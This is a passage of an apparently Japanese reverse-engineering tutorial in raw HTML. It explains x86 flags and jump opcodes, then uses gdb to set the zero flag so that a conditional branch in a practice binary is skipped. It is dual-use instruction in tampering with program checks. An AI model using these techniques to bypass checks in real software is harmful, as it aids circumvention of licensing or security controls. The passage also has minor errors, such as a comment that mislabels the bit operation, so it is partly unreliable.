6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;EFRAGSを書き換えて条件分岐をバイパスする&lt;/h3&gt;
&lt;p&gt;まずは&lt;code class=&quot;language-text&quot;&gt;is_vuln&lt;/code&gt;の結果をもとに条件分岐を行っている行を見てみます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/eb435fcc24e3245f59f2812000ec8048/0b533/image-52.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 65.41666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACb0lEQVQ4y02T63aTQBRG+ypqE+bOZRgGCEkgiZdq1br0l77/c2wPTa35MQtYHPbsM+fjzhvHMRccTu847jYsRvOjDfxeIue95VQpvvYjT4cDX4eBvd7x0O55HxxnrWUZjHM4a3FyvUtl4mev+Li84fN4z6NW/GkNfzrDl1JgTvEzB37tS350nkdV8eRKvsvGT0rxTZa+Bbqmp2wtedjSp4JOCs8xcWojndcMzhJTIPaeqi0JrqYONZUPVC8Qews05R4jNm7e4AclLwzzkDlPLaWx1FI4DA22HWm6ljq1aN9hQ/sMsvYFJsteDWfUruD+4Z5iX6AFeJxnDodMobTs6lnmkXJcSNNE3a6giA+NvLtC9I2lAI+oacvmyz1qBRrD6VDz4XKgbjyuspwvn6iydNKM+G4Su4T1V+Dadqct/r/hC/DxHWrZPhuelx1P3z7LucpHlTzPA6elp5/2uHyhyWLa1DJdTy3H0t8CbVoI0ZCzDCUqWilYmoaPfWQSi35raGKg7SpibChML7BMVZrn81sjU9y2rMMkhobNw1vUvBpq9ruay2mgTZW0ZwhjRk89bkiYUlJR1QR/BZYCWSVeDYOvUNlTLFqGY1G2ZOwrPkmwD0stLcqU8xqtTGh7Qn/C1VnOMAjw2u77QtMINKyG3kc2ueXtsWIroMJ1xOFIs3h8L1MOnjR0MoyMbyU+tYCacM2fvULWwZQv93dJjGKjxGIjFkrUJcxdx27siRLyNYtusJhR1k6j5ffU/fY1yCtoHUz6Z1iWEtboGdOWLOAosZklKg/ZcRkqcu1ITSJUCS+1vh7wEp9/hlFAkzKvln8BnLGaRLPV0XEAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/eb435fcc24e3245f59f2812000ec8048/8ac56/image-52.webp 240w,
/static/eb435fcc24e3245f59f2812000ec8048/d3be9/image-52.webp 480w,
/static/eb435fcc24e3245f59f2812000ec8048/b0a15/image-52.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/eb435fcc24e3245f59f2812000ec8048/8ff5a/image-52.png 240w,
/static/eb435fcc24e3245f59f2812000ec8048/e85cb/image-52.png 480w,
/static/eb435fcc24e3245f59f2812000ec8048/0b533/image-52.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/eb435fcc24e3245f59f2812000ec8048/0b533/image-52.png&quot;
            alt=&quot;2021/12/image-52.png&quot;
            title=&quot;2021/12/image-52.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ここで、&lt;code class=&quot;language-text&quot;&gt;var_8h&lt;/code&gt;というのは&lt;code class=&quot;language-text&quot;&gt;is_vulun&lt;/code&gt;が格納されたローカル変数です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令によって、32bit符号なし整数(&lt;code class=&quot;language-text&quot;&gt;dword&lt;/code&gt;)として１との比較を行っています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;0x00001160      837df801       &lt;span class=&quot;token function&quot;&gt;cmp&lt;/span&gt; dword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;var_8h&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
0x00001164      &lt;span class=&quot;token number&quot;&gt;7542&lt;/span&gt;           jne 0x11a8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令は、条件分岐の際に2つの値を比較する場合によく登場しますが、その実態はただの減算です。&lt;/p&gt;
&lt;p&gt;ただし、減算を行う&lt;code class=&quot;language-text&quot;&gt;sub&lt;/code&gt;命令とは異なり、演算結果をレジスタに格納することはありません。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/45898438/understanding-cmp-instruction&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;assembly - Understanding cmp instruction - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ではなぜ単なる減算を行うだけの&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令を条件分岐に使用しているのかといえば、演算によってフラグレジスタが更新されるためです。&lt;/p&gt;
&lt;p&gt;フラグレジスタは、CPUが演算を行った際に演算結果や状態を示すために使用されるレジスタです。&lt;/p&gt;
&lt;p&gt;x86_64アーキテクチャではRFLAGSレジスタの下位32bitが使用されています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ja.wikibooks.org/wiki/X86%E3%82%A2%E3%82%BB%E3%83%B3%E3%83%96%E3%83%A9/x86%E3%82%A2%E3%83%BC%E3%82%AD%E3%83%86%E3%82%AF%E3%83%81%E3%83%A3&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;X86アセンブラ/x86アーキテクチャ - Wikibooks&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;フラグレジスタは、32bitのうちの各bitの値にそれぞれ意味があり、演算結果に基づいて値が変更されます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 699px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f296a5af214f2dff11cda42feb2ca683/3fe45/image-53.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 53.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABs0lEQVQoz4VTiY6iUBD0/39sTEREjes46CiHyC2K4AFY09WG2clusktSvKPfq66uhsH1ekVd19+43W643+8Kxi6XC6qq+g1Z1zL253mmB88O8OO5lCXiOMHxeFTEcQzP8xS+7yuiKER4OMgYYR8ECGQehiG6rlNSJXw+n0qY5zkMw1CMRiPMZnPYto35fK5Yva8QCIn98SGwJT6DZVkao3olJFnbNlpiluWaLUkSFEWhCbgmCRVx/3Q64SxI0hTn81nPcY8KacGAnuz3e1UyHA5hmhNMp1M4joNCDrJ0EvdeNk2jl0ux58+H8UFdV6rA2e1gTYRMylgsFtjJmt4xlmWZqiEpKyEp171dvWVKyEy8tN1+Yjweqy80n8pYIsn6JhH/JWRW3/ew2WykVEtVLpdLufzyhqBPJCAej8e/CdmZXDLTM9M0sV6v4bou0jRDKcnOUkEPVkMiJqnr618ealP4IoHnuYiko6+snRjfyqTF88fYydfQijpwD6JMmtO2rYKN+lZI0uZxhxsXMOwQ6yDHLzeFsY5gbl5YOCmsbYyJzN9WB7y9H1CUFR7iKf8ugnZ8AdENQZIJLbYoAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f296a5af214f2dff11cda42feb2ca683/8ac56/image-53.webp 240w,
/static/f296a5af214f2dff11cda42feb2ca683/d3be9/image-53.webp 480w,
/static/f296a5af214f2dff11cda42feb2ca683/32d5d/image-53.webp 699w&quot;
              sizes=&quot;(max-width: 699px) 100vw, 699px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f296a5af214f2dff11cda42feb2ca683/8ff5a/image-53.png 240w,
/static/f296a5af214f2dff11cda42feb2ca683/e85cb/image-53.png 480w,
/static/f296a5af214f2dff11cda42feb2ca683/3fe45/image-53.png 699w&quot;
            sizes=&quot;(max-width: 699px) 100vw, 699px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f296a5af214f2dff11cda42feb2ca683/3fe45/image-53.png&quot;
            alt=&quot;2021/12/image-53.png&quot;
            title=&quot;2021/12/image-53.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;※ 画像は&lt;a href=&quot;https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel Developper Manual&lt;/a&gt;より&lt;/p&gt;
&lt;p&gt;フラグレジスタの値の内、特に条件分岐に使用することの多いレジスタは以下の通りです。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;FLAG&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;用途&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;bit番号&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;CF（キャリーフラグ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;加算においてレジスタの大きさを越える値を使用する場合に、桁上がりが発生した場合にセットされる&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;ZF（ゼロフラグ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;操作の結果がゼロ (0) になった場合にセットされる&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;SF（符号フラグ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;操作の結果が負となった場合にセットされる&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;7&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;OF（オーバーフローフラグ）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;符号付き算術演算の結果がレジスタに格納できないほど大きい値になった場合にセットされる&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;11&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令によって条件分岐する場合には、減算結果が0であるか、もしくは正の値や負の値であるかによって分岐を決定します。&lt;/p&gt;
&lt;p&gt;実際にフラグレジスタの値に基づいて分岐を決定するのはいくつかのジャンプ命令です。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;命令&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;ジャンプ条件&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;Opcode&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;JE&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;等しい(ZF = 1)&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;74&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;JNE&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;等しくない(ZF = 0）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;75&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;JG&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;より大きい（ZF = 0 &amp;#x26; SF = OF）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;7F&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;JGE&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;より大きいか等しい（SD = OF）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;７D&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;JNG&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;より大きくない（ZF = 1 | SF ! OF）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;７E&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;JL&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;より小さい（SF ! OF）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;７C&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://codezine.jp/article/detail/485&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;インラインアセンブラで学ぶアセンブリ言語 第3回 (1/3)：CodeZine（コードジン）&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;右列のオペコード(opcode)は、すぐに探せるようにしておくとパッチを当てて強制的に条件分岐を改ざんするときなどに便利です。&lt;/p&gt;
&lt;p&gt;オペランドによってオペコードが変わる場合もありますが、基本的には以下のIDMを探すとよいと思います。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/321e7818549221e66d148ffce09673e7/0b533/image-54.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 60.83333333333334%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAAB/ElEQVQoz02TiW7iUAxF8//fhaZCpWwBAlnYIWtD2Hc8Pm4ZTSTLz+/Z1/a148ySUoJVKbP8IP66ktEiVynk/njK8/mU6/Uql8tF7ve7aezj8WhnvtfrZYIv4kTRWNK8kJsGVNut+H4gcZzI7XaT0+kkYRhIvV6XNE3l4+OPuG5PoiiU5XIph8NB9vu97HY7OZ/P5u/MZjPZbDZmfH8X0uv1/tlVVVngYDCQPM9Nr9dr6ff7MlBxXVf66o9dlhtL4EwmEymKwowsy8RVB2wyA7xarSQIAnsLw1CSJDFgfzSSkcp4PLY7OijLUhwuqASOKgXodDr2QMtwlcSxBQPueZ4Bf301rLJOu22gvIFB647v+1YRwTg3m02tJDIbx/l8bkF5nhlgrAlICmBXdbfb/YlXirY6A2c6nVpFAMDTT1BiFJAVzmgVQPimNU9bjvRuqL68AQRFBjiOIgt8PB6myc4DFFjLyg9JSPp/y/ihh8OhyVorZ5UcVoDKqAjN5LIMe28gi8XCgKwy1VSMD9vwnjC0MDwbylzb4GBro1x4nq7IL6dUGitApF3AE/oNzJnpI1PdFLYFzp1QLwCkRXStVrMqmDK8cO79rhI6SzNpNBrS1gk3Pj+l1WoZl9xThENG2gWAiiCZTO9frChyW27eaAtamCxn6ECYPDj4/AWnPnaKK/hvZgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/321e7818549221e66d148ffce09673e7/8ac56/image-54.webp 240w,
/static/321e7818549221e66d148ffce09673e7/d3be9/image-54.webp 480w,
/static/321e7818549221e66d148ffce09673e7/b0a15/image-54.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/321e7818549221e66d148ffce09673e7/8ff5a/image-54.png 240w,
/static/321e7818549221e66d148ffce09673e7/e85cb/image-54.png 480w,
/static/321e7818549221e66d148ffce09673e7/0b533/image-54.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/321e7818549221e66d148ffce09673e7/0b533/image-54.png&quot;
            alt=&quot;2021/12/image-54.png&quot;
            title=&quot;2021/12/image-54.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;http://sparksandflames.com/files/x86InstructionChart.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel x86 Assembler Instruction Set Opcode Table&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;Jcc—Jump if Condition Is Met&lt;/code&gt;のテーブルを参照してください。&lt;/p&gt;
&lt;p&gt;ここまでフラグレジスタとジャンプ命令について整理したところで、本題に戻ります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;is_vulun&lt;/code&gt;の値が1であるかを特定する以下の条件分岐をバイパスしていきましょう。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;0x00001160      837df801       &lt;span class=&quot;token function&quot;&gt;cmp&lt;/span&gt; dword &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;var_8h&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;, &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;
0x00001164      &lt;span class=&quot;token number&quot;&gt;7542&lt;/span&gt;           jne 0x11a8&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;var_8h&lt;/code&gt;には必ず0が格納されるので、&lt;code class=&quot;language-text&quot;&gt;0x00001160&lt;/code&gt;の&lt;code class=&quot;language-text&quot;&gt;cmp&lt;/code&gt;命令が実行された結果、フラグレジスタは&lt;code class=&quot;language-text&quot;&gt;[ CF PF AF SF IF ]&lt;/code&gt;のフラグが立っている状態になります。&lt;/p&gt;
&lt;p&gt;ここでは各フラグの詳細についてはいったん気にしなくてよいので、&lt;code class=&quot;language-text&quot;&gt;jne&lt;/code&gt;で処理をスキップされないために必要な&lt;code class=&quot;language-text&quot;&gt;ZF&lt;/code&gt;が立っていない点に着目してください。&lt;/p&gt;
&lt;p&gt;gdbで実行してみた結果は以下のようになります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;$ b *0x555555555164
$ p &lt;span class=&quot;token variable&quot;&gt;$eflags&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$5&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; CF PF AF SF IF &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e84b8d431db46c8aa3cd53e1cc2abce6/0b533/image-55.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 63.33333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAARlAAAEZQAGA43XUAAACLklEQVQ4y2WTWXbrIBBEvZ1nWxNikhCaB8uOk/2vpl6BE8dJPjgg1Fyqq5vD7XbB+/sNl8uKaRqwbTOkLCFUiVJLtHOPqneohwZ1W8NxTrIUp9MJ5/P5Ob6+D9frhvv9in3fMM8DlmVCWRJmJIQU6BYCR0+QR901cFyf0+Qb+AIOe4eg8OPjDVfOAXi5LFQoUTsDbRRu9w37bcZ+nbGsA9cLsk+Fv0dUuO8r7m87Viobhi7OpRBwtYVi6muwgRdZJeEqg6ayT0BCQJokcTwVaqVwpX83ghceHrsW6zxCEZAwsHFVXA99i76lj9bAGI2K4JxKM8YUaRrhEShEEX1blhHD2KHnwVCcshTRH+8blFQaAIJ7KSF5nqMsCmQEpUn6M2VtK1azgjQ1pLaQSkNZxypbGNdBcS8U6d8xHKL5IT2OLM2QElgQ/APYjzOaYUU77XDdiMoyHa1jGrIQsYVq+qnZQpb/8jyL6qNKXhRAafriYdP1bIcpQpt+RvC0cR5t27EwTfTP9wM849p+5L5H13laYGhPR0tctMi5+qGwHSb22ENhO20wBI4MDAUK63DQWhvT04atpBW/DYL3QWVR5LF4yWelD7Z2UKaCqT1U5VAwnWC4YHBOnwwPWxYkQIOKMKtgCVsr/Avr1148NAwqeYu2NbRrIB2fmW9jcEG/Qo8dWZDHOD7m06NAx+PpzxM8eAI9U5z2CzzTL4RElgu+htAaWXwVrwee49eT+5r/A22gqEdyTBJ9AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e84b8d431db46c8aa3cd53e1cc2abce6/8ac56/image-55.webp 240w,
/static/e84b8d431db46c8aa3cd53e1cc2abce6/d3be9/image-55.webp 480w,
/static/e84b8d431db46c8aa3cd53e1cc2abce6/b0a15/image-55.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e84b8d431db46c8aa3cd53e1cc2abce6/8ff5a/image-55.png 240w,
/static/e84b8d431db46c8aa3cd53e1cc2abce6/e85cb/image-55.png 480w,
/static/e84b8d431db46c8aa3cd53e1cc2abce6/0b533/image-55.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e84b8d431db46c8aa3cd53e1cc2abce6/0b533/image-55.png&quot;
            alt=&quot;2021/12/image-55.png&quot;
            title=&quot;2021/12/image-55.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;実際にZFが立っていないことが確認できました。&lt;/p&gt;
&lt;p&gt;ここで条件分岐をバイパスするためには、ZFを立てる必要があります。&lt;/p&gt;
&lt;p&gt;gdbでは、メモリのデータは&lt;code class=&quot;language-text&quot;&gt;set&lt;/code&gt;コマンドで改ざんすることができます。&lt;/p&gt;
&lt;p&gt;先ほど確認した通り、ZFはフラグレジスタの6bit目の値が対応しています。&lt;/p&gt;
&lt;p&gt;つまり、フラグレジスタの6bit目の値を強制的に1に書き換えることでZFを立てることができます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# OR演算で$eflagsの6bit目の値を0に設定する&lt;/span&gt;
$ &lt;span class=&quot;token builtin class-name&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;$eflags&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
$ p &lt;span class=&quot;token variable&quot;&gt;$eflags&lt;/span&gt;
&lt;span class=&quot;token variable&quot;&gt;$7&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt; CF PF AF ZF SF IF &lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上記のように、&lt;code class=&quot;language-text&quot;&gt;set $eflags |= (1 &amp;lt;&amp;lt; 6)&lt;/code&gt;を実行することでZFを立てることができました。&lt;/p&gt;
&lt;p&gt;この状態で&lt;code class=&quot;language-text&quot;&gt;n&lt;/code&gt;コマンドで処理を進めると、本来実行されるはずのない&lt;code class=&quot;language-text&quot;&gt;0x555555555166&lt;/code&gt;に処理を進めることができました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e96edda2a2e25f369363488ec7a6b81e/0b533/image-56.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 69.16666666666667%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAARlAAAEZQAGA43XUAAACVklEQVQ4y3VU2W7bMBD050S27oMUJeqWjxx2m6LpQ/vQAilQtP//Pp2lLTsN0IcFSXE5nJ1ZaqWVhsoLZHmOMIoRhNElQkRxgqwoEaeZW1/3gvC85ugz5Jzv+y5W1dSiqSskSYwwCJgUIGSyRBzHyLIMURS5WL6laeryk4QXZimBAmw2G/iMlSGgrWvkZJlnOYoih9YKxmiUJdmr4gIkoKEDk30BklzJEWYOUBiauUczHjAcTi5KU2Hoz5dopRARTNgIoLCTQ57nuXnoyg6uYDKuyrGFKWtUlWU0MJVB23aoa0uWNWxjcThsua5gbXVlnaaJYyxSLIBnhr1F3w+wBFFl5UpSpYHmBYqAYpaALDoKMxnX67UDesvOMTRDg2noyVIjpasxkwUkpbNJQvEJIIyW0t6CvI2bhoNFwzLFoUBCDKBmvgAwQdZ5njnAO2rnkZnkbtZLrN9pKG3TWgdSsNySbZKTaUmWmnPDMSHrIA5haZJ89zkPU5rCM1GW8NKbMSslYncNxmlE37YYug5d06CijrUxmMcZ0zhSzxLzMLj9gvOQl0dsnZjsI8pyBRzbBi/PR3z5dMLT/Q73uwm7sUfCWwu2ilE59mODrtJojULL0fJb4F1MeV/yN7bF74c9/jwe8HM74nUe8Z19eEoivOgcn02OX08zXrcdfmxbF1+txnTnnUGcKTejVi0dPn58wofnE6bdjP3DAfN+RkqtLLXVLPt4emTDl0ipqeIriVmu9z+XlS75hAo+J+3erczlCcY0ZulJxT33Q5CfgR+4MQyjf2IB/AuN6cOdwAKN3AAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e96edda2a2e25f369363488ec7a6b81e/8ac56/image-56.webp 240w,
/static/e96edda2a2e25f369363488ec7a6b81e/d3be9/image-56.webp 480w,
/static/e96edda2a2e25f369363488ec7a6b81e/b0a15/image-56.webp 500w&quot;
